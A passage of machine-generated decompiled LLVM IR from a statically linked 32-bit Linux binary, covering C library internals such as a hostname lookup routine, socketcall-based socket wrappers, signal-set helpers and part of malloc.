  %v1_805ecf7 = add i32 %v0_805ecf7, -44
  store i32 %v1_805ecf7, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_805ecf7, 256
  br i1 %tmp44, label %dec_label_pc_805ef4d, label %dec_label_pc_805ed0a

dec_label_pc_805ed0a:                             ; preds = %dec_label_pc_805ecf7
  %v0_805ed0a = load i32, i32* @ebp, align 4
  %v1_805ed0a = add i32 %v0_805ed0a, 12
  %v1_805ed11 = add i32 %v0_805ed0a, 44
  store i32 %v1_805ed11, i32* @edi, align 4
  store i32 %v1_805ed11, i32* %stack_var_-108, align 4
  %v3_805ed1e = inttoptr i32 %v1_805ed11 to i8*
  %v4_805ed1e = call i32 @strncpy(i8* %v3_805ed1e, i32 %arg1, i32 %v1_805ecf7)
  %v0_805ed23 = load i32, i32* @edi, align 4
  %v1_805ed23 = load i32, i32* @ebp, align 4
  %v2_805ed23 = add i32 %v1_805ed23, 12
  %v3_805ed23 = inttoptr i32 %v2_805ed23 to i32*
  store i32 %v0_805ed23, i32* %v3_805ed23, align 4
  %v1_805ed2a = add i32 %v0_805ed0a, 16
  %v2_805ed2a = inttoptr i32 %v1_805ed2a to i32*
  store i32 0, i32* %v2_805ed2a, align 4
  %v2_805ed31 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805ed31, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805ed33 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805ed38 = inttoptr i32 %arg1 to i8*
  %v3_805ed38 = call i32 @inet_aton(i8* %v2_805ed38, i32 %v0_805ed33)
  store i32 %v3_805ed38, i32* %eax.global-to-local, align 4
  %v1_805ed40 = icmp eq i32 %v3_805ed38, 0
  br i1 %v1_805ed40, label %dec_label_pc_805ed7c, label %dec_label_pc_805ed44

dec_label_pc_805ed44:                             ; preds = %dec_label_pc_805ed0a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805ed48 = load i32, i32* @edi, align 4
  store i32 %v0_805ed48, i32* %arg2, align 4
  %v1_805ed4a = add i32 %tmp18, 8
  %v2_805ed4a = inttoptr i32 %v1_805ed4a to i32*
  store i32 2, i32* %v2_805ed4a, align 4
  %v0_805ed51 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ed51 = add i32 %v0_805ed51, 12
  %v2_805ed51 = inttoptr i32 %v1_805ed51 to i32*
  store i32 4, i32* %v2_805ed51, align 4
  %v2_805ed58 = load i32, i32* %stack_var_-92, align 4
  %v1_805ed5b = load i32, i32* %edx.global-to-local, align 4
  %v2_805ed5b = add i32 %v1_805ed5b, 16
  %v3_805ed5b = inttoptr i32 %v2_805ed5b to i32*
  store i32 %v2_805ed58, i32* %v3_805ed5b, align 4
  %v1_805ed62 = load i32, i32* %edx.global-to-local, align 4
  %v2_805ed62 = add i32 %v1_805ed62, 4
  %v3_805ed62 = inttoptr i32 %v2_805ed62 to i32*
  store i32 %v1_805ed0a, i32* %v3_805ed62, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805ed69 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805ed69, i32* %v1_805ec3b, align 4
  store i32 0, i32* %v1_805ec89, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ef52

dec_label_pc_805ed7c:                             ; preds = %dec_label_pc_805ed0a
  %v0_805ed7c = load i32, i32* %stack_var_-108, align 4
  %v3_805ed7c = call i32 @__open_nameservers(i32 %v0_805ed7c, i32 %v0_805ed33, i32 %v1_805ecf7)
  store i32 %v3_805ed7c, i32* %eax.global-to-local, align 4
  %v2_805ed8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_805ed8c, i32* @ebx, align 4
  store i32 %v2_805ed8c, i32* %stack_var_-108, align 4
  %v4_805ed91 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134586897, i32 ptrtoint (i32* @global_var_807500c.723 to i32))
  store i32 %v4_805ed91, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %stack_var_-108, align 4
  %v1_805ed9d = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807500c.723 to i32))
  %v2_805eda8 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805eda8, i32* @ecx, align 4
  store i32 134586897, i32* %eax.global-to-local, align 4
  store i32 %v2_805ed8c, i32* %stack_var_-108, align 4
  %v3_805edad = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805edc8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_805edcd = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805edcd, i32* %eax.global-to-local, align 4
  store i32 %v2_805edcd, i32* %stack_var_-108, align 4
  %v0_805edd7 = load i32, i32* @esi, align 4
  %v7_805edde = call i32 @__dns_lookup(i8* %v2_805ed38, i32 1, i32 %v0_805edd7, i32 ptrtoint (i32* @global_var_807f554.725 to i32), i32 %v2_805edcd, i32 %v2_805edc8)
  store i32 %v7_805edde, i32* %eax.global-to-local, align 4
  %v2_805ede6 = icmp slt i32 %v7_805edde, 0
  %v1_805ede8 = icmp eq i1 %v2_805ede6, false
  br i1 %v1_805ede8, label %dec_label_pc_805edfe, label %dec_label_pc_805edea

dec_label_pc_805edea:                             ; preds = %dec_label_pc_805ed7c
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805ec89, align 4
  br label %dec_label_pc_805ef52

dec_label_pc_805edfe:                             ; preds = %dec_label_pc_805ed7c
  %v4_805edfe = trunc i64 %tmp11 to i32
  store i32 %v4_805edfe, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805ee11 = icmp ugt i32 %v1_805ecf7, 256
  %v15_805ee11 = icmp eq i32 %v0_805ecf7, 300
  %v2_805ee15 = or i1 %v10_805ee11, %v15_805ee11
  br i1 %v2_805ee15, label %dec_label_pc_805eeb0, label %dec_label_pc_805ee17

dec_label_pc_805ee17:                             ; preds = %dec_label_pc_805edfe
  %v3_805ee1a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805ee1a, i32* %stack_var_-108, align 4
  %v1_805ee1e = call i32 @free(i32 %v3_805ee1a)
  store i32 %v1_805ee1e, i32* %eax.global-to-local, align 4
  %v2_805ee23 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805ee23, i32* @edi, align 4
  %v3_805ee24 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ee24, i32* %stack_var_-108, align 4
  %v1_805ee28 = call i32 @free(i32 %v3_805ee24)
  store i32 -1, i32* %v1_805ec89, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ef28

dec_label_pc_805eeb0:                             ; preds = %dec_label_pc_805edfe
  %v3_805eeb5.pre = load i32, i32* %stack_var_-76, align 4
  %v0_805eeb9.pre = load i32, i32* @edi, align 4
  store i32 %v0_805eeb9.pre, i32* %stack_var_-108, align 4
  %v3_805eeba = inttoptr i32 %v0_805eeb9.pre to i8*
  %v4_805eeba = call i32 @strncpy(i8* %v3_805eeba, i32 %v3_805eeb5.pre, i32 %v1_805ecf7)
  store i32 %v4_805eeba, i32* %eax.global-to-local, align 4
  %v2_805eebf = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805eebf, i32* @ecx, align 4
  %v3_805eec0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805eec0, i32* %stack_var_-108, align 4
  %v1_805eec4 = call i32 @free(i32 %v3_805eec0)
  store i32 %v1_805eec4, i32* %eax.global-to-local, align 4
  %v12_805eecc = icmp eq i32 %tmp10, 1
  %v1_805eed1 = icmp eq i1 %v12_805eecc, false
  br i1 %v1_805eed1, label %dec_label_pc_805ef2d, label %dec_label_pc_805eed3

dec_label_pc_805eed3:                             ; preds = %dec_label_pc_805eeb0
  %v0_805eed3 = load i32, i32* @edx, align 4
  %v0_805eeda = load i32, i32* @ebp, align 4
  store i32 %v0_805eeda, i32* %stack_var_-108, align 4
  %v3_805eedb = inttoptr i32 %tmp to i16*
  %v4_805eedb = call i32 @memcpy(i16* %v3_805eedb, i32 4, i32 %v0_805eed3)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_805eee4 = load i32, i32* @edi, align 4
  store i32 %v0_805eee4, i32* %arg2, align 4
  %v1_805eee6 = add i32 %tmp18, 8
  %v2_805eee6 = inttoptr i32 %v1_805eee6 to i32*
  store i32 2, i32* %v2_805eee6, align 4
  %v0_805eeed = load i32, i32* %eax.global-to-local, align 4
  %v1_805eeed = add i32 %v0_805eeed, 12
  %v2_805eeed = inttoptr i32 %v1_805eeed to i32*
  store i32 4, i32* %v2_805eeed, align 4
  %v3_805eef4 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_805eef4, i32* %edx.global-to-local, align 4
  %v1_805eef8 = load i32, i32* %eax.global-to-local, align 4
  %v2_805eef8 = add i32 %v1_805eef8, 16
  %v3_805eef8 = inttoptr i32 %v2_805eef8 to i32*
  store i32 %v3_805eef4, i32* %v3_805eef8, align 4
  store i32 %v1_805ed0a, i32* @ecx, align 4
  %v1_805eeff = load i32, i32* %eax.global-to-local, align 4
  %v2_805eeff = add i32 %v1_805eeff, 4
  %v3_805eeff = inttoptr i32 %v2_805eeff to i32*
  store i32 %v1_805ed0a, i32* %v3_805eeff, align 4
  %v2_805ef02 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805ef02, i32* %eax.global-to-local, align 4
  %v3_805ef03 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ef03, i32* %stack_var_-108, align 4
  %v1_805ef07 = call i32 @free(i32 %v3_805ef03)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805ec3b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_805ec89, align 4
  br label %dec_label_pc_805ef28

dec_label_pc_805ef28:                             ; preds = %dec_label_pc_805ef2d, %dec_label_pc_805ee17, %dec_label_pc_805eed3
  br label %dec_label_pc_805ef52

dec_label_pc_805ef2d:                             ; preds = %dec_label_pc_805eeb0
  %v3_805ef30 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ef30, i32* %stack_var_-108, align 4
  %v1_805ef34 = call i32 @free(i32 %v3_805ef30)
  store i32 1, i32* %v1_805ec89, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ef28

dec_label_pc_805ef4d:                             ; preds = %dec_label_pc_805ecf7, %dec_label_pc_805ecdb, %dec_label_pc_805eccf, %dec_label_pc_805ecbc, %dec_label_pc_805ecb0
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ef52

dec_label_pc_805ef52:                             ; preds = %dec_label_pc_805ec9c, %dec_label_pc_805ec95, %dec_label_pc_805ec51, %entry, %dec_label_pc_805ef28, %dec_label_pc_805edea, %dec_label_pc_805ed44, %dec_label_pc_805ef4d
  store i32 %v0_805ec2b, i32* @ebx, align 4
  store i32 %v0_805ec2a, i32* @esi, align 4
  store i32 %v0_805ec29, i32* @edi, align 4
  store i32 %v0_805ec28, i32* @ebp, align 4
  %v0_805ef59 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805ef59

; uselistorder directives
  uselistorder i32 %v1_805ed11, { 1, 0, 2 }
  uselistorder i32 %v1_805ed0a, { 2, 1, 0 }
  uselistorder i32 %v1_805ecf7, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 %v0_805ecc0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805eca9, { 1, 0 }
  uselistorder i32 %v2_805ec89, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805ec89, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805ec3b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-108, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 29, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805ef52, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805ef28, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805ecbc, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f643 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f64a = call i32 @__socketcall(i32 2, i32 %v2_805f643)
  ret i32 %v2_805f64a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f66f = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f676 = call i32 @__socketcall(i32 3, i32 %v2_805f66f)
  ret i32 %v2_805f676

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805f703 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805f70a = call i32 @__socketcall(i32 10, i32 %v2_805f703)
  ret i32 %v2_805f70a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805f7a7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805f7ae = call i32 @__socketcall(i32 9, i32 %v2_805f7a7)
  ret i32 %v2_805f7ae

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805f853 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805f85a = call i32 @__socketcall(i32 14, i32 %v2_805f853)
  ret i32 %v2_805f85a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805f87f = ptrtoint i32* %stack_var_-12 to i32
  %v2_805f886 = call i32 @__socketcall(i32 1, i32 %v2_805f87f)
  ret i32 %v2_805f886

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 0, 1, 5, 3, 4, 2 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805f8d4, label %dec_label_pc_805f8c7

dec_label_pc_805f8c7:                             ; preds = %entry
  %v1_805f8c7 = add i32 %arg1, -64
  %v3_805f8c7 = sub i32 63, %arg1
  %v4_805f8c7 = and i32 %v3_805f8c7, %arg1
  %v5_805f8c7 = icmp slt i32 %v4_805f8c7, 0
  %v6_805f8c7 = icmp eq i32 %v1_805f8c7, 0
  %v7_805f8c7 = icmp slt i32 %v1_805f8c7, 0
  %v3_805f8ca = icmp eq i1 %v7_805f8c7, %v5_805f8c7
  %v4_805f8ca = icmp eq i1 %v6_805f8c7, false
  %v5_805f8ca = and i1 %v4_805f8ca, %v3_805f8ca
  br i1 %v5_805f8ca, label %dec_label_pc_805f8d4, label %dec_label_pc_805f8cc

dec_label_pc_805f8cc:                             ; preds = %dec_label_pc_805f8c7
  %v0_805f8cf = call i32 @__sigdelset()
  br label %dec_label_pc_805f8d4

dec_label_pc_805f8d4:                             ; preds = %dec_label_pc_805f8c7, %entry, %dec_label_pc_805f8cc
  %v1_805f8d4 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_805f8d9 = inttoptr i32 %v1_805f8d4 to i32*
  store i32 22, i32* %v1_805f8d9, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805f8c7, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805f8d4, { 2, 0, 1 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805f98e = add i32 %arg2, -1
  %v1_805f991 = urem i32 %v1_805f98e, 32
  %v2_805f991 = icmp eq i32 %v1_805f991, 0
  store i32 %v1_805f991, i32* @ecx, align 4
  %v2_805f994 = udiv i32 %v1_805f98e, 32
  br i1 %v2_805f991, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805f997 = shl i32 1, %v1_805f991
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805f999 = phi i32 [ 1, %entry ], [ %v5_805f997, %bb ]
  %v2_805f999 = mul nuw nsw i32 %v2_805f994, 4
  %v3_805f999 = add i32 %v2_805f999, %arg1
  %v4_805f999 = inttoptr i32 %v3_805f999 to i32*
  %v5_805f999 = load i32, i32* %v4_805f999, align 4
  %v7_805f999 = and i32 %v5_805f999, %v6_805f999
  %v8_805f999 = icmp eq i32 %v7_805f999, 0
  %v1_805f99d = icmp eq i1 %v8_805f999, false
  %v2_805f99d = zext i1 %v1_805f99d to i32
  ret i32 %v2_805f99d

; uselistorder directives
  uselistorder i32 %v1_805f991, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805f9a4 = load i32, i32* @ebx, align 4
  store i32 %v0_805f9a4, i32* %stack_var_-4, align 4
  %v1_805f9b2 = add i32 %arg2, -1
  %v1_805f9b5 = urem i32 %v1_805f9b2, 32
  %v2_805f9b5 = icmp eq i32 %v1_805f9b5, 0
  store i32 %v1_805f9b5, i32* @ecx, align 4
  br i1 %v2_805f9b5, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_805f9b8 = shl i32 1, %v1_805f9b5
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_805f9bd = phi i32 [ 1, %entry ], [ %v5_805f9b8, %bb ]
  %v2_805f9ba = udiv i32 %v1_805f9b2, 32
  store i32 %v2_805f9ba, i32* @edx, align 4
  %v2_805f9bd = mul nuw nsw i32 %v2_805f9ba, 4
  %v3_805f9bd = add i32 %v2_805f9bd, %arg1
  %v4_805f9bd = inttoptr i32 %v3_805f9bd to i32*
  %v5_805f9bd = load i32, i32* %v4_805f9bd, align 4
  %v7_805f9bd = or i32 %v5_805f9bd, %v6_805f9bd
  store i32 %v7_805f9bd, i32* %v4_805f9bd, align 4
  %v2_805f9c2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805f9c2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805f9ba, { 1, 0 }
  uselistorder i32 %v1_805f9b5, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805f9c4 = load i32, i32* @ebx, align 4
  store i32 %v0_805f9c4, i32* %stack_var_-4, align 4
  %v1_805f9d2 = add i32 %tmp3, -1
  %v1_805f9d5 = urem i32 %v1_805f9d2, 32
  %v2_805f9d5 = icmp eq i32 %v1_805f9d5, 0
  br i1 %v2_805f9d5, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_805f9d8 = shl i32 -2, %v1_805f9d5
  %v5_805f9d8 = sub nsw i32 32, %v1_805f9d5
  %v6_805f9d8 = lshr i32 -2, %v5_805f9d8
  %v7_805f9d8 = or i32 %v6_805f9d8, %v4_805f9d8
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_805f9dd = phi i32 [ -2, %entry ], [ %v7_805f9d8, %bb ]
  %v2_805f9da = udiv i32 %v1_805f9d2, 32
  %v2_805f9dd = mul nuw nsw i32 %v2_805f9da, 4
  %v3_805f9dd = add i32 %v2_805f9dd, %tmp
  %v4_805f9dd = inttoptr i32 %v3_805f9dd to i32*
  %v5_805f9dd = load i32, i32* %v4_805f9dd, align 4
  %v7_805f9dd = and i32 %v5_805f9dd, %v6_805f9dd
  store i32 %v7_805f9dd, i32* %v4_805f9dd, align 4
  %v2_805f9e2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805f9e2, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805f9d5, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_805f9e4 = load i32, i32* @eax, align 4
  %v6_805f9f7 = icmp ugt i32 %v0_805f9e4, 16777215
  br i1 %v6_805f9f7, label %dec_label_pc_805fa08, label %dec_label_pc_805f9f9

dec_label_pc_805f9f9:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_805f9e4, 256
  %v2_805f9e6 = udiv i32 %v0_805f9e4, 256
  %v2_805f9f9 = call i32 @llvm.ctlz.i32(i32 %v2_805f9e6, i1 true)
  %v3_805f9f9 = xor i32 %v2_805f9f9, 31
  %v5_805f9f9 = select i1 %tmp, i32 95, i32 %v3_805f9f9
  %v1_805f9fc = add nuw nsw i32 %v5_805f9f9, 6
  store i32 %v1_805f9fc, i32* @ecx, align 4
  %v2_805f9ff = urem i32 %v1_805f9fc, 32
  %v4_805f9ff = icmp eq i32 %v2_805f9ff, 0
  br i1 %v4_805f9ff, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805f9f9
  %v5_805f9ff = lshr i32 %v0_805f9e4, %v2_805f9ff
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805f9f9, %bb
  %v0_805fa01 = phi i32 [ %v0_805f9e4, %dec_label_pc_805f9f9 ], [ %v5_805f9ff, %bb ]
  %v1_805fa01 = urem i32 %v0_805fa01, 4
  %v2_805fa04 = mul nuw nsw i32 %v5_805f9f9, 4
  %v3_805fa04 = or i32 %v1_805fa01, 32
  %v4_805fa04 = add nuw nsw i32 %v3_805fa04, %v2_805fa04
  br label %dec_label_pc_805fa08

dec_label_pc_805fa08:                             ; preds = %entry, %bb4
  %v0_805fa09 = phi i32 [ 95, %entry ], [ %v4_805fa04, %bb4 ]
  ret i32 %v0_805fa09

; uselistorder directives
  uselistorder i32 %v2_805f9ff, { 1, 0 }
  uselistorder i32 %v0_805f9e4, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_805fa08, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805fa0a = load i32, i32* @ebp, align 4
  %v0_805fa0b = load i32, i32* @edi, align 4
  %v0_805fa0c = load i32, i32* @esi, align 4
  %v0_805fa0d = load i32, i32* @ebx, align 4
  store i32 %v0_805fa0d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805fa1f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805fa1f, i32* %eax.global-to-local, align 4
  store i32 %v2_805fa1f, i32* %stack_var_-92, align 4
  %v4_805fa24 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  store i32 %v4_805fa24, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074eb0.646 to i32), i32* %stack_var_-92, align 4
  %v1_805fa30 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074eb0.646 to i32))
  store i32 %v1_805fa30, i32* %eax.global-to-local, align 4
  %v0_805fa38 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805fa38, -32
  br i1 %tmp, label %dec_label_pc_805fa4f, label %dec_label_pc_805fa3d

dec_label_pc_805fa3d:                             ; preds = %entry
  %v0_805fa3d = load i32, i32* %stack_var_-92, align 4
  %v1_805fa3d = call i32 @__errno_location(i32 %v0_805fa3d)
  store i32 %v1_805fa3d, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805fa44 = inttoptr i32 %v1_805fa3d to i32*
  store i32 12, i32* %v1_805fa44, align 4
  br label %dec_label_pc_80601a2

dec_label_pc_805fa4f:                             ; preds = %entry
  %v1_805fa4f = add i32 %v0_805fa38, 11
  %tmp127 = icmp ult i32 %v1_805fa4f, 16
  br i1 %tmp127, label %dec_label_pc_805fa66, label %dec_label_pc_805fa5f

dec_label_pc_805fa5f:                             ; preds = %dec_label_pc_805fa4f
  %v1_805fa5f = and i32 %v1_805fa4f, -8
  br label %dec_label_pc_805fa66

dec_label_pc_805fa66:                             ; preds = %dec_label_pc_805fa4f, %dec_label_pc_805fa5f
  %storemerge124 = phi i32 [ %v1_805fa5f, %dec_label_pc_805fa5f ], [ %v1_805fa4f, %dec_label_pc_805fa4f ]
  %v1_805fe06 = phi i32 [ %v1_805fa5f, %dec_label_pc_805fa5f ], [ 16, %dec_label_pc_805fa4f ]
  store i32 %storemerge124, i32* %eax.global-to-local, align 4
  %v0_805fa66 = load i8, i8* @global_var_807f120.729, align 1
  %v1_805fa66 = sext i8 %v0_805fa66 to i32
  store i32 %v1_805fa66, i32* @ebx, align 4
  %v3_805fa6c = urem i8 %v0_805fa66, 2
  %v4_805fa6c = icmp eq i8 %v3_805fa6c, 0
  %v1_805fa6f = icmp eq i1 %v4_805fa6c, false
  br i1 %v1_805fa6f, label %dec_label_pc_805fa8e, label %dec_label_pc_805fa71

dec_label_pc_805fa71:                             ; preds = %dec_label_pc_805fa66
  %v2_805fa71 = icmp eq i8 %v0_805fa66, 0
  %v1_805fa73 = icmp eq i1 %v2_805fa71, false
  br i1 %v1_805fa73, label %dec_label_pc_805fd71, label %dec_label_pc_805fa79

dec_label_pc_805fa79:                             ; preds = %dec_label_pc_805fa71
  store i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32* %stack_var_-92, align 4
  %v2_805fa81 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f120.729 to i32*))
  store i32 %v2_805fa81, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fd71

dec_label_pc_805fa8e:                             ; preds = %dec_label_pc_805fa66
  %v11_805fa8e = trunc i32 %v1_805fe06 to i8
  %v8_805fa92 = icmp ugt i8 %v11_805fa8e, %v0_805fa66
  br i1 %v8_805fa92, label %dec_label_pc_805faaf, label %dec_label_pc_805fa94

dec_label_pc_805fa94:                             ; preds = %dec_label_pc_805fa8e
  %v2_805fa98 = udiv i32 %v1_805fe06, 2
  store i32 %v2_805fa98, i32* %eax.global-to-local, align 4
  %v1_805fa9a = add i32 %v2_805fa98, ptrtoint (i8* @global_var_807f120.729 to i32)
  store i32 %v1_805fa9a, i32* @ecx, align 4
  %v1_805faa0 = add i32 %v2_805fa98, add (i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32 -4)
  %v2_805faa0 = inttoptr i32 %v1_805faa0 to i32*
  %v3_805faa0 = load i32, i32* %v2_805faa0, align 4
  store i32 %v3_805faa0, i32* %edx.global-to-local, align 4
  %v1_805faa3 = icmp eq i32 %v3_805faa0, 0
  br i1 %v1_805faa3, label %dec_label_pc_805faaf, label %dec_label_pc_805faa7

dec_label_pc_805faa7:                             ; preds = %dec_label_pc_805fa94
  %v1_805faa7 = add i32 %v3_805faa0, 8
  %v2_805faa7 = inttoptr i32 %v1_805faa7 to i32*
  %v3_805faa7 = load i32, i32* %v2_805faa7, align 4
  store i32 %v3_805faa7, i32* %eax.global-to-local, align 4
  store i32 %v3_805faa7, i32* %v2_805faa0, align 4
  br label %dec_label_pc_805fae8

dec_label_pc_805faaf:                             ; preds = %dec_label_pc_805fa94, %dec_label_pc_805fa8e
  %v8_805faaf = icmp ult i32 %v1_805fe06, 255
  %v6_805fab7 = icmp ugt i32 %v1_805fe06, 255
  store i32 %v1_805fe06, i32* @eax, align 4
  br i1 %v6_805fab7, label %dec_label_pc_805faf0, label %dec_label_pc_805fab9

